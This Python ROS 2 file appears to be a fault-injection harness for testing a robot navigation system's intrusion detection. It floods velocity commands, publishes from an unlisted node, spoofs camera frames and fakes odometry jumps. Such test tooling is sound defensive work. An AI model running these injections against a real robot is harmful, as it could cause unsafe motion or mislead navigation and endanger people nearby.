"""Adversarial fault-injection harness for SecureNav-NEXUS HIL/digital-twin testing.

Modes:  dos | spoof | rogue | gps_denial | all
  dos         flood /cmd_vel at high rate (T0814)
  rogue       a non-allowlisted node publishes /cmd_vel (T0855)
  spoof       replay a frozen, noise-injected camera frame on /camera/color/image_raw (T0856)
  gps_denial  stop /gps/fix and publish a drifting /odom jump (localization attack)
Run ONLY against simulation or isolated test benches.
"""
from __future__ import annotations

import argparse
import threading
import time

import numpy as np
import rclpy
from geometry_msgs.msg import Twist
from nav_msgs.msg import Odometry
from rclpy.node import Node
from rclpy.qos import qos_profile_sensor_data
from sensor_msgs.msg import Image

from common.logging_setup import get_logger

log = get_logger("nexus.faultinject")


class Injector(Node):
    def __init__(self, mode: str, duration: float, rate: float) -> None:
        super().__init__("attacker_" + mode)  # deliberately NOT in the IDS allowlist
        self.mode, self.duration, self.rate = mode, duration, rate
        self.cmd = self.create_publisher(Twist, "/cmd_vel", 10)
        self.img = self.create_publisher(Image, "/camera/color/image_raw", qos_profile_sensor_data)
        self.odom = self.create_publisher(Odometry, "/odom", 10)
        self.t0 = time.time()
        self.create_timer(1.0 / rate, self.step)

    def step(self) -> None:
        if time.time() - self.t0 > self.duration:
            log.info("injection finished", extra={"fields": {"mode": self.mode}})
            rclpy.shutdown()
            return
        if self.mode in ("dos", "rogue", "all"):
            t = Twist()
            t.linear.x = 2.0 if self.mode != "rogue" else 0.8  # dangerous velocity
            self.cmd.publish(t)
        if self.mode in ("spoof", "all"):
            m = Image(height=240, width=320, encoding="rgb8", step=320 * 3)
            m.data = np.random.default_rng(1).integers(0, 255, 240 * 320 * 3, dtype=np.uint8).tobytes()
            self.img.publish(m)
        if self.mode in ("gps_denial", "all"):
            o = Odometry()
            o.pose.pose.position.x = 1e3 * (time.time() - self.t0)  # impossible jump
            self.odom.publish(o)


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("mode", choices=["dos", "spoof", "rogue", "gps_denial", "all"])
    ap.add_argument("--duration", type=float, default=15.0)
    ap.add_argument("--rate", type=float, default=500.0, help="publish Hz (dos) - rogue uses min(rate,20)")
    a = ap.parse_args()
    rclpy.init()
    rate = min(a.rate, 20.0) if a.mode == "rogue" else a.rate
    node = Injector(a.mode, a.duration, rate)
    threading.Event()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    finally:
        node.destroy_node()


if __name__ == "__main__":
    main()
